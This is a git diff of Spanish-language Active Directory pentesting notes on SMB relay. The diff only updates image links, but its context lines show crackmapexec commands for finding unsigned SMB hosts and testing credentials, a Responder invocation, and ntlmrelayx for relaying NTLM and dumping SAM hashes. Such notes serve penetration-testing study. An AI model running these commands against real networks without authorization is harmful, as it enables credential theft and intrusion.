@@ -7,7 +7,7 @@
 
 # Explicación gráfica del vector de ataque
 
-[Ver la imagen](Images/main/README.md)
+[Ver la imagen](/Apuntes-AD/Images/7.md)
 
 # Como ver si el smb está fimado
 
@@ -15,7 +15,7 @@
 crackmapexec smb <segmento_red>
 ```
 
-[Ver Ejemplo](Images/firma/README.md)
+[Ver Ejemplo](/Apuntes-AD/Images/8.md)
 
 
 # Comprobar si tus credenciales son privilegiadas sobre un equipo
@@ -23,7 +23,7 @@ crackmapexec smb <segmento_red>
 ```
 crackmapexec smb <target> -u 'USUARIO' -p 'CONTRASEÑA'
 ```
-[Ver Ejemplo](Images/creds/README.md)
+[Ver Ejemplo](/Apuntes-AD/Images/9.md)
 
 
 # Configurar Responder para SMB Relay
@@ -42,7 +42,7 @@ python /usr/share/responder.py -I tun0 -rdw
 ```
 ntlmrelayx.py -tf <targets.txt> -smb2support
 ```
-[Ver Ejemplo de dumpeo de SAM](Images/sam/README.md)
+[Ver Ejemplo de dumpeo de SAM](/Apuntes-AD/Images/10.md)
 
 # Ejecutar comandos mediante un SMB Relay por IPv4
 ```
